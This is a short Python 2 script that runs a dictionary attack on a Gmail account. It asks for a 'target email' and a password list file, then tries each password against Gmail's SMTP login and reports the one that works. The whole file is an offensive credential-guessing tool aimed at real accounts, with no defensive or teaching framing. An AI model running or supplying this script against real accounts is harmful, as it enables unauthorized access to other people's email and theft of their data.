import smtplib

server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()

user = raw_input('Enter the target email : ')
passfile = raw_input('enter the pass filenmae : ')
passfile = open(passfile, 'r')

for password in passfile:
	try:
		server.login(user, password)
		
		print '<+> Password found: %s' % password
		break;
	except smtplib.SMTPAuthenticationError:
		print '<-> password wrong: %s' % password 
